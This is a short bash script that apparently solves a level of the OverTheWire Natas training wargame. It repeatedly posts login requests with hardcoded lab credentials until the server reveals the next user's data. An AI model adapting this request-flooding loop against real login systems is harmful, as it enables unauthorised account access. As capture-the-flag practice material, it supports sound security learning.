#!/bin/bash

number=1
while :
do
    echo "number: $number"
    output=`curl --silent -u natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ -d "username=natas28&password=" http://natas27.natas.labs.overthewire.org`
    match=`echo "$output" | grep -c "Here is your data"`
    if [[ $match -ne 0 ]]
    then
	echo "$output"
	break
    fi
    number=$((number + 1))
done
